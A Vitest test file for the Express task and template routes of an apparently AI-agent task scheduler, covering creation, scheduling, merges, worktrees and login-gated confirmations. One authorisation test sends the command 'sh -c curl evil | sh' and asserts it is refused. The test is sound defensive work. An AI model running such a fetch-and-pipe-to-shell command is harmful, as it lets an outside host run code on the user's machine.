import express from 'express';
import * as fs from 'fs';
import * as path from 'path';
import request from 'supertest';
import { afterAll, beforeEach, describe, expect, it, vi } from 'vitest';
import type { TaskRecord } from '../../shared/tasks.js';
import { RM_TEST_DIR } from '../../test/helpers/rm-test-dir.js';
import { TaskScheduler } from '../services/task-scheduler.js';

const home = vi.hoisted(() => {
  const nodeFs = require('fs') as typeof import('fs');
  const nodeOs = require('os') as typeof import('os');
  const nodePath = require('path') as typeof import('path');
  return nodeFs.mkdtempSync(nodePath.join(nodeOs.tmpdir(), 'ut-task-routes-'));
});

vi.mock('os', async (importOriginal) => {
  const actual = await importOriginal<typeof import('os')>();
  return { ...actual, homedir: () => home, default: { ...actual, homedir: () => home } };
});
vi.mock('chokidar', () => ({
  watch: vi.fn(() => ({ on: vi.fn(), close: vi.fn(async () => {}) })),
}));

const { ConfigService } = await import('../services/config-service.js');
const { createTaskRoutes } = await import('./tasks.js');
const { TaskCommands } = await import('../services/task-commands.js');
const { ProjectSettingsStore } = await import('../services/project-settings.js');

describe('task routes', () => {
  let app: express.Express;
  let configService: InstanceType<typeof ConfigService>;
  let launch: ReturnType<typeof vi.fn>;
  let scheduler: TaskScheduler;
  let notify: ReturnType<typeof vi.fn>;
  /** The auth middleware's verdict for the next requests (the app signed in by default). */
  let authMethod: string;

  beforeEach(async () => {
    fs.rmSync(path.join(home, '.untether'), RM_TEST_DIR);
    configService = new ConfigService();
    launch = vi.fn(async () => ({ sessionId: 'sess-1' }));
    scheduler?.stop();
    scheduler = new TaskScheduler({
      storePath: path.join(home, 'control', `tasks-${Math.random()}.json`),
      launch: launch as unknown as (t: TaskRecord, p: string) => Promise<{ sessionId: string }>,
      notify: vi.fn(),
      sessionStatus: () => 'running',
    });
    await scheduler.start(0);
    notify = vi.fn();
    authMethod = 'password';
    const commands = new TaskCommands({
      scheduler: () => scheduler,
      settings: new ProjectSettingsStore(path.join(home, 'projects.json')),
      notify,
    });
    app = express();
    app.use(express.json());
    app.use((req, _res, next) => {
      (req as { authMethod?: string }).authMethod = authMethod;
      next();
    });
    app.use(
      '/api',
      createTaskRoutes({
        configService,
        scheduler: () => scheduler,
        commands,
        orchestrators: () => [{ repoPath: '/repo', sessionId: 'orch-1' }],
        pinnedProjects: () => [{ repoPath: '/notes', git: false }],
        groupOrder: () => ['/notes', '/repo'],
        sessionOrder: () => ['s2', 's1'],
        collapsedGroups: () => ['/repo'],
      })
    );
  });

  it('GET /tasks lists the tasks, the running orchestrators, the pinned projects and the group order', async () => {
    const listed = await request(app).get('/api/tasks');
    expect(listed.status).toBe(200);
    expect(listed.body).toEqual({
      tasks: [],
      orchestrators: [{ repoPath: '/repo', sessionId: 'orch-1' }],
      pinnedProjects: [{ repoPath: '/notes', git: false }],
      groupOrder: ['/notes', '/repo'],
      sessionOrder: ['s2', 's1'],
      collapsedGroups: ['/repo'],
      // The signed-in app also gets what waits for its OK.
      confirmations: [],
    });
  });

  afterAll(() => {
    scheduler?.stop();
    fs.rmSync(home, RM_TEST_DIR);
  });

  describe('templates', () => {
    it('creates, edits, lists and deletes templates, saved in the config file', async () => {
      const created = await request(app)
        .post('/api/task-templates')
        .send({ name: ' Docs ', prompt: 'Documenta {folder}' });
      expect(created.status).toBe(200);
      const id = created.body.template.id;
      expect(created.body.template).toMatchObject({ name: 'Docs', prompt: 'Documenta {folder}' });

      const saved = JSON.parse(
        fs.readFileSync(path.join(home, '.untether', 'config.json'), 'utf8')
      );
      expect(saved.taskTemplates).toEqual([{ id, name: 'Docs', prompt: 'Documenta {folder}' }]);

      const edited = await request(app)
        .put(`/api/task-templates/${id}`)
        .send({ name: 'Docs 2', prompt: 'Escribe la doc' });
      expect(edited.body.template).toEqual({ id, name: 'Docs 2', prompt: 'Escribe la doc' });

      const list = await request(app).get('/api/task-templates');
      expect(list.body.templates).toEqual([{ id, name: 'Docs 2', prompt: 'Escribe la doc' }]);

      expect((await request(app).delete(`/api/task-templates/${id}`)).status).toBe(200);
      expect((await request(app).get('/api/task-templates')).body.templates).toEqual([]);
      expect((await request(app).delete(`/api/task-templates/${id}`)).status).toBe(404);
    });

    it('rejects an empty name or prompt and an unknown id', async () => {
      expect(
        (await request(app).post('/api/task-templates').send({ name: ' ', prompt: 'x' })).status
      ).toBe(400);
      expect(
        (await request(app).post('/api/task-templates').send({ name: 'x', prompt: '' })).status
      ).toBe(400);
      expect(
        (
          await request(app)
            .post('/api/task-templates')
            .send({ name: 'x'.repeat(81), prompt: 'y' })
        ).status
      ).toBe(400);
      expect(
        (await request(app).put('/api/task-templates/nope').send({ name: 'x', prompt: 'y' })).status
      ).toBe(404);
    });

    it('caps the number of templates', async () => {
      for (let i = 0; i < 50; i++) {
        await request(app)
          .post('/api/task-templates')
          .send({ name: `t${i}`, prompt: 'p' });
      }
      const over = await request(app).post('/api/task-templates').send({ name: 'x', prompt: 'p' });
      expect(over.status).toBe(400);
      expect(configService.getTaskTemplates()).toHaveLength(50);
    });

    it('a broken template in a hand-edited config drops the templates, not the config', () => {
      const file = path.join(home, '.untether', 'config.json');
      const config = JSON.parse(fs.readFileSync(file, 'utf8'));
      fs.writeFileSync(
        file,
        JSON.stringify({ ...config, repositoryBasePath: '/keep/me', taskTemplates: [{ id: 1 }] })
      );
      const reloaded = new ConfigService();
      expect(reloaded.getConfig().repositoryBasePath).toBe('/keep/me');
      expect(reloaded.getTaskTemplates()).toEqual([]);
    });
  });

  describe('tasks', () => {
    const body = {
      name: 'Arregla lint',
      prompt: 'Arregla los errores de lint en {folder}',
      workingDir: '/tmp',
      command: ['claude'],
      shielded: true,
    };

    it('runs a task now and returns its session', async () => {
      const res = await request(app).post('/api/tasks').send(body);
      expect(res.status).toBe(200);
      expect(res.body.task).toMatchObject({
        state: 'working',
        isolation: 'none',
        sessionId: 'sess-1',
        notify: true,
      });
      expect(launch.mock.calls[0][0]).toMatchObject({ shielded: true, agent: 'claude' });
      expect(launch.mock.calls[0][1]).toBe('Arregla los errores de lint en tmp');
    });

    it('schedules, lists, edits and cancels a task', async () => {
      const runAt = new Date(Date.now() + 3600_000).toISOString();
      const res = await request(app)
        .post('/api/tasks')
        .send({ ...body, runAt });
      expect(res.body.task.state).toBe('scheduled');
      expect(launch).not.toHaveBeenCalled();
      const id = res.body.task.id;

      const later = new Date(Date.now() + 7200_000).toISOString();
      const edited = await request(app).put(`/api/tasks/${id}`).send({ runAt: later });
      expect(edited.body.task.runAt).toBe(later);

      expect((await request(app).get('/api/tasks')).body.tasks).toHaveLength(1);
      expect((await request(app).delete(`/api/tasks/${id}`)).status).toBe(200);
      expect((await request(app).get('/api/tasks')).body.tasks).toHaveLength(0);
    });

    // 2026-11-11: "Run now" while editing a scheduled task had no way in: runAt null was a 400.
    it('runAt null on a scheduled task runs it now, through the normal start', async () => {
      const runAt = new Date(Date.now() + 3600_000).toISOString();
      const { id } = (
        await request(app)
          .post('/api/tasks')
          .send({ ...body, runAt })
      ).body.task;
      expect(launch).not.toHaveBeenCalled();

      const before = Date.now();
      const edited = await request(app)
        .put(`/api/tasks/${id}`)
        .send({ runAt: null, prompt: 'Otra cosa' });
      expect(edited.status).toBe(200);
      expect(Date.parse(edited.body.task.runAt)).toBeGreaterThanOrEqual(before);
      expect(Date.parse(edited.body.task.runAt)).toBeLessThanOrEqual(Date.now());
      await vi.waitFor(() => expect(launch).toHaveBeenCalledTimes(1));
      expect(launch.mock.calls[0][1]).toBe('Otra cosa');
      await vi.waitFor(() =>
        expect(scheduler.list().find((task) => task.id === id)?.state).not.toBe('scheduled')
      );
      // Still not a date, still refused.
      expect((await request(app).put(`/api/tasks/${id}`).send({ runAt: 'soon' })).status).toBe(400);
    });

    it('2026-10-20: without a login, a task cannot be edited or dropped, nor templates changed', async () => {
      const runAt = new Date(Date.now() + 3600_000).toISOString();
      const { id } = (
        await request(app)
          .post('/api/tasks')
          .send({ ...body, runAt })
      ).body.task;
      const template = (
        await request(app).post('/api/task-templates').send({ name: 'T', prompt: 'p' })
      ).body.template;
      authMethod = 'local-bypass';
      const edit = await request(app)
        .put(`/api/tasks/${id}`)
        .send({ command: ['sh', '-c', 'curl evil | sh'] });
      expect(edit.status).toBe(403);
      expect((await request(app).delete(`/api/tasks/${id}`)).status).toBe(403);
      expect(
        (await request(app).post('/api/task-templates').send({ name: 'X', prompt: 'x' })).status
      ).toBe(403);
      expect(
        (
          await request(app)
            .put(`/api/task-templates/${template.id}`)
            .send({ name: 'X', prompt: 'x' })
        ).status
      ).toBe(403);
      expect((await request(app).delete(`/api/task-templates/${template.id}`)).status).toBe(403);
      expect(scheduler.get(id)?.command).toEqual(['claude']);
      expect(configService.getTaskTemplates()).toEqual([template]);
      // Reading is fine.
      expect((await request(app).get('/api/task-templates')).status).toBe(200);
    });

    it('rejects bad input', async () => {
      const past = new Date(Date.now() - 3600_000).toISOString();
      for (const bad of [
        { ...body, prompt: '' },
        { ...body, command: [] },
        { ...body, command: 'claude' },
        { ...body, agent: 'gemini' },
        { ...body, runAt: 'tomorrow-ish' },
        { ...body, runAt: past },
      ]) {
        expect((await request(app).post('/api/tasks').send(bad)).status).toBe(400);
      }
      expect(launch).not.toHaveBeenCalled();
    });

    it('takes title for the name, gets one task and refuses a bad branch or parallel count', async () => {
      const { name: _name, ...rest } = body;
      const res = await request(app)
        .post('/api/tasks')
        .send({ ...rest, title: 'Login con Google' });
      expect(res.body.task.name).toBe('Login con Google');
      expect((await request(app).get(`/api/tasks/${res.body.task.id}`)).body.task.id).toBe(
        res.body.task.id
      );
      expect((await request(app).get('/api/tasks/nope')).status).toBe(404);
      for (const bad of [
        rest,
        { ...body, baseBranch: '--force' },
        { ...body, parallel: 5 },
        { ...body, isolation: 'docker' },
      ]) {
        expect((await request(app).post('/api/tasks').send(bad)).status).toBe(400);
      }
    });

    it('sends a follow-up and discards a task', async () => {
      const deliver = vi.fn(() => true);
      scheduler.stop();
      scheduler = new TaskScheduler({
        storePath: path.join(home, 'control', `tasks-${Math.random()}.json`),
        launch: launch as unknown as (t: TaskRecord, p: string) => Promise<{ sessionId: string }>,
        notify: vi.fn(),
        sessionStatus: () => 'running',
        deliver,
        stopSession: async () => {},
      });
      await scheduler.start(0);
      const { id } = (await request(app).post('/api/tasks').send(body)).body.task;
      const sent = await request(app).post(`/api/tasks/${id}/send`).send({ text: 'Y el logout' });
      expect(sent.status).toBe(200);
      expect(sent.body.task.followUps).toEqual([
        expect.objectContaining({ text: 'Y el logout', via: 'ui' }),
      ]);
      // Typed under its message id and sender (agent-messages.ts, 2026-11-10).
      expect(deliver).toHaveBeenCalledWith(
        'sess-1',
        expect.stringMatching(/^\[untether\] Message m[a-z2-9]{6} from the user:\nY el logout$/),
        'claude'
      );
      expect((await request(app).post(`/api/tasks/${id}/send`).send({ text: '' })).status).toBe(
        400
      );

      const discarded = await request(app).post(`/api/tasks/${id}/discard`).send({});
      expect(discarded.body.task.state).toBe('discarded');
      const again = await request(app).post(`/api/tasks/${id}/send`).send({ text: 'x' });
      expect(again.status).toBe(409);
      expect(again.body.error).toBe('not-open');
      expect((await request(app).post('/api/tasks/nope/discard').send({})).status).toBe(404);
    });

    it('answers 409 needs-confirmation when discarding would lose work', async () => {
      const remove = vi.fn(async () => ({ worktreeRemoved: true, branchDeleted: true }));
      scheduler.stop();
      scheduler = new TaskScheduler({
        storePath: path.join(home, 'control', `tasks-${Math.random()}.json`),
        launch: launch as unknown as (t: TaskRecord, p: string) => Promise<{ sessionId: string }>,
        notify: vi.fn(),
        sessionStatus: () => 'running',
        stopSession: async () => {},
        worktrees: {
          create: async () => ({
            repoPath: '/repo',
            baseBranch: 'main',
            baseSha: 'abc',
            branch: 'ut/x',
            worktreePath: '/wt/x',
            clonedDirs: [],
          }),
          remove,
          commitLeftovers: async () => false,
          changes: async () => ({
            files: [],
            stats: { commits: 0, files: 0, insertions: 0, deletions: 0 },
          }),
          hasUnmergedWork: async () => true,
        },
      });
      await scheduler.start(0);
      const res = await request(app)
        .post('/api/tasks')
        .send({ ...body, isolation: 'worktree', parallel: 2 });
      expect(res.body.tasks).toHaveLength(2);
      // Answered before the worktrees exist: they are made in the background.
      expect(res.body.tasks.map((t: TaskRecord) => t.state)).toEqual(['preparing', 'preparing']);
      await scheduler.settled();
      const { id } = res.body.task;
      const refused = await request(app).post(`/api/tasks/${id}/discard`).send({});
      expect(refused.status).toBe(409);
      expect(refused.body.error).toBe('needs-confirmation');
      expect((await request(app).delete(`/api/tasks/${id}`)).status).toBe(409);
      const ok = await request(app).post(`/api/tasks/${id}/discard`).send({ confirm: true });
      expect(ok.body.task.state).toBe('discarded');
      expect(remove).toHaveBeenCalledTimes(1);
    });

    it('reports a task whose session could not start', async () => {
      launch.mockRejectedValueOnce(new Error('Folder not found: /nope'));
      const res = await request(app).post('/api/tasks').send(body);
      expect(res.status).toBe(500);
      expect(res.body.error).toBe('Folder not found: /nope');
    });
  });

  describe('merge, verify, fix and logs', () => {
    const body = {
      name: 'Login',
      prompt: 'Añade login',
      workingDir: '/tmp',
      command: ['claude'],
      isolation: 'worktree',
      // Policy ask: the user's fix and merge, with no automatic fix in between.
      mergePolicy: 'ask',
    };
    let pipeline: ReturnType<typeof vi.fn>;
    let deliver: ReturnType<typeof vi.fn>;
    let logDir: string;

    beforeEach(async () => {
      pipeline = vi.fn(async () => ({
        state: 'failed',
        blocker: { kind: 'verify', message: 'The check failed' },
        verify: { command: 'pnpm test', cwd: '/wt/x', startedAt: 'x', exitCode: 1, tail: 'FAIL' },
      }));
      deliver = vi.fn(() => true);
      logDir = path.join(home, 'task-logs');
      scheduler.stop();
      scheduler = new TaskScheduler({
        storePath: path.join(home, 'control', `tasks-${Math.random()}.json`),
        launch: launch as unknown as (t: TaskRecord, p: string) => Promise<{ sessionId: string }>,
        notify: vi.fn(),
        sessionStatus: () => 'running',
        deliver,
        stopSession: async () => {},
        logDir,
        pipeline: pipeline as never,
        worktrees: {
          create: async () => ({
            repoPath: '/repo',
            baseBranch: 'main',
            baseSha: 'abc',
            branch: 'ut/login',
            worktreePath: '/wt/x',
            clonedDirs: [],
          }),
          remove: async () => ({ worktreeRemoved: true, branchDeleted: true }),
          commitLeftovers: async () => false,
          changes: async () => ({
            files: ['a.ts'],
            stats: { commits: 1, files: 1, insertions: 1, deletions: 0 },
          }),
          hasUnmergedWork: async () => true,
        },
      });
      await scheduler.start(0);
    });

    it('fix types the failure into the agent; merge and verify answer verifying at once', async () => {
      const { id } = (await request(app).post('/api/tasks').send(body)).body.task;
      await scheduler.settled();
      expect((await request(app).post(`/api/tasks/${id}/merge`).send({})).status).toBe(409);
      await scheduler.markDone('sess-1');
      await scheduler.settled();
      expect((await request(app).get(`/api/tasks/${id}`)).body.task.state).toBe('failed');

      const fixed = await request(app).post(`/api/tasks/${id}/fix`).send({});
      expect(fixed.status).toBe(200);
      expect(fixed.body.task.state).toBe('working');
      expect(deliver.mock.calls[0][1]).toContain('FAIL');
      const again = await request(app).post(`/api/tasks/${id}/fix`).send({});
      expect(again.body.error).toBe('not-fixable');

      pipeline.mockResolvedValueOnce({ state: 'ready' });
      await scheduler.markDone('sess-1');
      await scheduler.settled();
      let release: () => void = () => {};
      pipeline.mockImplementationOnce(
        () =>
          new Promise((resolve) => (release = () => resolve({ state: 'merged', mergedSha: 'f' })))
      );
      const merging = await request(app).post(`/api/tasks/${id}/merge`).send({ acceptRisk: true });
      expect(merging.status).toBe(200);
      expect(merging.body.task.state).toBe('verifying');
      expect((await request(app).post(`/api/tasks/${id}/verify`).send({})).body.error).toBe('busy');
      expect(
        (await request(app).post(`/api/tasks/${id}/merge`).send({ acceptRisk: 'y' })).status
      ).toBe(400);
      release();
      await scheduler.settled();
      expect(pipeline.mock.calls.at(-1)?.[1]).toMatchObject({ mode: 'merge', acceptRisk: true });
      expect((await request(app).get(`/api/tasks/${id}`)).body.task.state).toBe('merged');
      expect((await request(app).post(`/api/tasks/${id}/verify`).send({})).status).toBe(409);
      expect((await request(app).post('/api/tasks/nope/merge').send({})).status).toBe(404);
    });

    it('POST /tasks/:id/revert answers { task } with the revert task; only for merged tasks', async () => {
      const { id } = (await request(app).post('/api/tasks').send(body)).body.task;
      await scheduler.settled();
      expect((await request(app).post(`/api/tasks/${id}/revert`).send({})).status).toBe(409);
      const internal = (
        scheduler as unknown as { tasks: Array<Record<string, unknown>> }
      ).tasks.find((entry) => entry.id === id) as Record<string, unknown>;
      Object.assign(internal, {
        state: 'merged',
        mergedSha: 'm1',
        mergedOnto: 'b1',
        repoPath: '/repo',
      });
      const res = await request(app).post(`/api/tasks/${id}/revert`).send({});
      expect(res.status).toBe(200);
      expect(res.body.task).toMatchObject({ revertOf: { taskId: id, from: 'b1', to: 'm1' } });
    });

    it('a request without a login gets merges and discards only with the user OK', async () => {
      const { id } = (await request(app).post('/api/tasks').send(body)).body.task;
      await scheduler.settled();
      await scheduler.markDone('sess-1');
      await scheduler.settled();
      const runs = pipeline.mock.calls.length;
      authMethod = 'local-bypass';
      const asked = await request(app).post(`/api/tasks/${id}/merge`).send({ acceptRisk: true });
      expect(asked.status).toBe(202);
      expect(asked.body).toMatchObject({
        status: 'pending-confirmation',
        confirmation: { kind: 'merge-risk', taskId: id, where: 'Login' },
      });
      const again = await request(app).post(`/api/tasks/${id}/merge`).send({ acceptRisk: true });
      expect(again.body.confirmation.id).toBe(asked.body.confirmation.id);
      expect(notify.mock.calls.filter(([p]) => p.type === 'task-confirm')).toHaveLength(1);
      const discard = await request(app).post(`/api/tasks/${id}/discard`).send({ confirm: true });
      expect(discard.status).toBe(202);
      expect(discard.body.confirmation.kind).toBe('discard');
      await scheduler.settled();
      expect(pipeline.mock.calls.length).toBe(runs);
      expect(scheduler.get(id)?.state).toBe('failed');
      // Reading is fine.
      expect((await request(app).get(`/api/tasks/${id}`)).status).toBe(200);
    });

    it('keeps one task of a parallel group: merges it and discards the others', async () => {
      const res = await request(app)
        .post('/api/tasks')
        .send({ ...body, parallel: 2 });
      await scheduler.settled();
      const [first, second] = res.body.tasks as TaskRecord[];
      expect((await request(app).post(`/api/tasks/${first.id}/keep`).send({})).status).toBe(409);
      await scheduler.markDone('sess-1');
      await scheduler.settled();
      pipeline.mockResolvedValueOnce({ state: 'merged', mergedSha: 'def' });
      const kept = await request(app).post(`/api/tasks/${first.id}/keep`).send({});
      expect(kept.status).toBe(200);
      // The others go once it is merged (2026-10-20), not before.
      expect(kept.body.discardOnMerge).toEqual([second.id]);
      await scheduler.settled();
      expect(scheduler.get(second.id)?.state).toBe('discarded');
      expect(scheduler.get(first.id)?.state).toBe('merged');
    });

    it('serves the end of a task log by kind', async () => {
      const { id } = (await request(app).post('/api/tasks').send(body)).body.task;
      await scheduler.settled();
      const empty = await request(app).get(`/api/tasks/${id}/log?kind=verify`);
      expect(empty.body).toEqual({ kind: 'verify', text: '', exists: false, taskId: id });
      fs.mkdirSync(path.join(logDir, id), { recursive: true });
      const lines = Array.from({ length: 50 }, (_, i) => `line ${i}`).join('\n');
      fs.writeFileSync(path.join(logDir, id, 'merge.log'), lines);
      const tail = await request(app).get(`/api/tasks/${id}/log?kind=merge&lines=3`);
      expect(tail.body).toEqual({
        kind: 'merge',
        text: 'line 47\nline 48\nline 49',
        exists: true,
        taskId: id,
      });
      expect((await request(app).get(`/api/tasks/${id}/log?kind=secrets`)).status).toBe(400);
      expect((await request(app).get('/api/tasks/nope/log')).status).toBe(404);
    });

    describe('routing a prompt from the home screen (P6)', () => {
      let routing: express.Express;

      beforeEach(() => {
        const commands = new TaskCommands({
          scheduler: () => scheduler,
          settings: new ProjectSettingsStore(path.join(home, 'projects.json')),
          notify,
          resolveRepo: async (dir) => (dir.startsWith('/repo') ? '/repo' : null),
        });
        routing = express();
        routing.use(express.json());
        routing.use((req, _res, next) => {
          (req as { authMethod?: string }).authMethod = authMethod;
          next();
        });
        routing.use(
          '/api',
          createTaskRoutes({ configService, scheduler: () => scheduler, commands })
        );
      });

      it('POST /tasks/route says where it goes; /tasks/submit sends it or starts a task', async () => {
        const { id } = (
          await request(routing)
            .post('/api/tasks')
            .send({ ...body, workingDir: '/repo' })
        ).body.task;
        await scheduler.settled();

        const routed = await request(routing)
          .post('/api/tasks/route')
          .send({ repoPath: '/repo', text: 'en ut/login cambia el texto' });
        expect(routed.status).toBe(200);
        expect(routed.body).toEqual({
          repoPath: '/repo',
          decision: { kind: 'match', taskId: id, reason: 'explicit', by: 'rules' },
          open: [{ id, name: 'Login', branch: 'ut/login', state: 'working' }],
        });

        const sent = await request(routing)
          .post('/api/tasks/submit')
          .send({ repoPath: '/repo', text: 'en ut/login cambia el texto', agent: 'claude' });
        expect(sent.status).toBe(200);
        expect(sent.body).toMatchObject({ action: 'sent', task: { id } });
        expect(deliver).toHaveBeenCalledWith(
          'sess-1',
          expect.stringMatching(
            /^\[untether\] Message m[a-z2-9]{6} from the user:\nen ut\/login cambia el texto$/
          ),
          'claude',
          { trustFolder: true }
        );

        const created = await request(routing)
          .post('/api/tasks/submit')
          .send({ repoPath: '/repo', text: 'Documenta la API', agent: 'claude', choice: 'new' });
        expect(created.status).toBe(200);
        expect(created.body).toMatchObject({
          action: 'created',
          task: { name: 'Documenta la API', isolation: 'worktree', repoPath: '/repo' },
        });

        expect(
          (
            await request(routing)
              .post('/api/tasks/route')
              .send({ repoPath: '/elsewhere', text: 'x' })
          ).status
        ).toBe(400);
        expect(
          (await request(routing).post('/api/tasks/submit').send({ repoPath: '/repo' })).status
        ).toBe(400);
      });

      it('a request without a login only reads; what it sends waits for the user', async () => {
        await request(routing)
          .post('/api/tasks')
          .send({ ...body, workingDir: '/repo' });
        await scheduler.settled();
        authMethod = 'local-bypass';
        const pending = await request(routing)
          .post('/api/tasks/submit')
          .send({ repoPath: '/repo', text: 'ut/login: añade logout', agent: 'claude' });
        expect(pending.status).toBe(202);
        expect(pending.body).toMatchObject({ status: 'pending-confirmation' });
        expect(deliver).not.toHaveBeenCalled();
      });
    });
  });
});
